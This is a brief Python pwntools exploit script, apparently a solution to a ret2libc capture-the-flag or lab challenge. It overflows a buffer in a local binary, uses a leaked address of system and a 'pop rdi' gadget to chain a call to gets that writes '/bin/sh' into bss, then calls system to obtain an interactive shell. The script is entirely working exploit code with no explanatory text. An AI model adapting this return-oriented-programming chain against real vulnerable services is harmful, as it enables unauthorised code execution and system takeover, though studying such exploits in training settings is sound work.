from pwn import *

context.arch = "amd64"
context.terminal = ['kitty', '-e', 'sh', '-c']

gets_offset = +0x2c0b0
payload = 'A' * 0x18

elf = ELF('ret2libc')
io = process('./ret2libc')

pop_rdi = next(elf.search(asm('pop rdi ; ret')))
bss = elf.bss()+0x100

system = int(io.recv().split('\n')[0],base=16)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(system+gets_offset)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(system)

io.sendline(payload)
io.sendline('/bin/sh\x00')
io.interactive()
